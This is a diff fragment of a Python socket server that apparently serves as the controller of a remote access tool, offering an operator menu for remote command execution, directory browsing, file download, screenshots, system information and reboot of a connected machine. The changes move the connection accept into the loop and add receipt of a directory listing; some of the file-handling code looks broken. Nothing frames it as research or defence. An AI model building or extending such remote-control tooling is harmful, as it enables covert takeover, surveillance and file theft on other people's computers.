@@ -5,10 +5,9 @@ host = '0.0.0.0'
 port = 81
 s.bind((host, port))
 s.listen(1)
-conn, addr = s.accept()
 while True:
-
-    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/poff - Power off\n/sysinfo - system information\n/dir - (Files, Download)\n/screen - ScreenShot\n> ')
+    conn, addr = s.accept()
+    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/reboot - Restart System\n/sysinfo - system information\n/dir - (Files, Download)\n/screen - ScreenShot\n> ')
     conn.send(a.encode())
 
     if a == '/cmd':
@@ -39,7 +38,6 @@ while True:
                         f.close()
                     except:
                         break
-
                 f = open('file.txt', 'r')
                 print(f.read())
                 f.close()
@@ -47,10 +45,21 @@ while True:
 
             elif direct == '2':
                 conn.send(direct.encode())
-                dir = input('Enter directory > ')
+                f = open('pwd.txt', 'wb')
+                while True:
+                    try:
+                        data = conn.recv(1024)
+                        if data == 'EOF'.encode():
+                            break
+                        f.write(data)
+                        print(data)
+                        f.close()
+                        os.remove('pwd.txt')
+                    except:
+                        break
+                dir = input('Directory > ')
                 conn.send(dir.encode())
                 f = open('file.txt', 'wb')
-
                 while True:
                     try:
                         data = conn.recv(1024)
